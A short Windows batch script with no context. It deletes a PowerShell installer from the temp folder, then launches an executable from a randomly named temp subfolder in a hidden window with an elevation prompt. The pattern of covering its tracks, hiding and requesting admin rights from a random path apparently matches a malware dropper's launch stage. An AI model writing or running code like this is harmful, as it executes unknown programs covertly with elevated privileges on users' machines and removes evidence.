@echo off
del /f %temp%/Dinstall.ps1

powershell -command start-process %temp%/sVBXKuz/wsappa.exe -WindowStyle Hidden -Verb runAs
exit
